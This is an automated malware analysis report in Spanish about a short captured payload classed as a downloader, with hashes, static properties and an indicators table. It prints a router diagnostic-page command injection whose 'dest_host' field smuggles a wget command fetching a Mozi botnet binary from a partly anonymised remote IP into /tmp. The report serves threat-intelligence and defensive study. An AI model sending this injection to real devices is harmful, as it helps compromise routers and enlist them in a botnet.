# 🧬 Payload Analysis

`1b2da0d9d04e911bbca08bbac52ee3ef19d94e7842772325f454cb2d83b6b796`

## 📌 Resumen

Texto ASCII de 118 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://61.52.227.XXX:45405/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://61.52.227.XXX:45405/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/1b2da0d9d04e911bbca08bbac52ee3ef19d94e7842772325f454cb2d83b6b796.md](../../../../../malware-like/oraculo/downloader/1b2da0d9d04e911bbca08bbac52ee3ef19d94e7842772325f454cb2d83b6b796.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:27:32.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `1b2da0d9d04e911bbca08bbac52ee3ef19d94e7842772325f454cb2d83b6b796`
- **MD5:** `d489ef7fcfca5608e41ea8bfc76c723e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.52.227.XXX:45405/Mozi.m+-O+->/tmp/gpon80;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://61.52.227.XXX:45405/Mozi.m+-O+- | strings |
| ip | 61.52.227.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.52.227.XXX:45405/Mozi.m+-O+->/tmp/gpon80; | strings |
| hash | 1b2da0d9d04e911bbca08bbac52ee3ef19d94e7842772325f454cb2d83b6b796 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
